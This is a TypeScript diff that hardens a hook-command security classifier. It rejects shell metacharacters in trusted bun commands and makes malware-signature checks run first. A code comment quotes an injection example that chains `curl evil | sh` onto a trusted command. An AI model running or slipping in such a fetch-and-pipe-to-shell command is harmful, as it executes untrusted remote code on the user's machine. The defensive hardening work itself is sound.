@@ -81,10 +81,14 @@ export async function loadSrcIntegrity(claudeDir?: string): Promise<SrcIntegrity
 
 // `bun "$HOME/.claude/src/<dir>/<name>.ts"` — accept quoted and unquoted
 // `$HOME` and `${HOME}` forms. Allow an optional trailing arg list (some
-// hooks invoke a script with positional args). Capture group 1 is the path
-// relative to ~/.claude/src — the install-manifest key.
+// hooks invoke a script with positional args, e.g. `swarm-log.ts start`),
+// but ONLY simple word-like tokens: shell metacharacters (`;`, `|`, `&`,
+// `$(`, backticks, redirects) are rejected so a payload concatenated onto a
+// trusted command (`bun .../x.ts ; curl evil | sh`) can never ride the
+// shipped-pattern match. Capture group 1 is the path relative to
+// ~/.claude/src — the install-manifest key.
 const TRUSTED_BUN_CC =
-  /^bun\s+"?\$\{?HOME\}?\/\.claude\/src\/((?:scripts|hooks|lib)\/[a-zA-Z0-9_-]+\.ts)"?(\s.*)?$/;
+  /^bun\s+"?\$\{?HOME\}?\/\.claude\/src\/((?:scripts|hooks|lib)\/[a-zA-Z0-9_-]+\.ts)"?(?:\s+[A-Za-z0-9_.:=/-]+)*\s*$/;
 
 /** Classify a single shipped-pattern command against the install manifest. */
 function classifyShippedPath(
@@ -206,24 +210,22 @@ export function classifyHookCommand(
   cmd: string,
   integrity?: SrcIntegrity | null,
 ): { severity: HookSeverity; reasons: string[] } {
-  // Shipped-pattern commands first. Trust is CONTENT-based (install manifest),
-  // not path-based. When there's no manifest we can't promote to "trusted" —
-  // but a malware-signature hit in the command still wins over "unknown".
+  // Malware signatures are checked FIRST and unconditionally — a hit always
+  // wins, even when the command would otherwise match the shipped pattern and
+  // verify against the manifest. Defense in depth: TRUSTED_BUN_CC already
+  // rejects shell metacharacters in trailing args, but pattern-match trust
+  // must never suppress an explicit malware signal.
+  const sus = matchSuspicious(cmd);
+  if (sus.length > 0) return { severity: "suspicious", reasons: sus };
+
+  // Shipped-pattern commands next. Trust is CONTENT-based (install manifest),
+  // not path-based.
   const m = cmd.match(TRUSTED_BUN_CC);
   if (m?.[1]) {
-    const result = classifyShippedPath(m[1], integrity);
-    if (result.severity === "unknown") {
-      const sus = matchSuspicious(cmd);
-      if (sus.length > 0) return { severity: "suspicious", reasons: sus };
-    }
-    return result;
+    return classifyShippedPath(m[1], integrity);
   }
   const compound = classifyCompound(cmd, integrity);
   if (compound) return compound;
-
-  // Then explicit suspicion.
-  const reasons = matchSuspicious(cmd);
-  if (reasons.length > 0) return { severity: "suspicious", reasons };
 
   return {
     severity: "unknown",
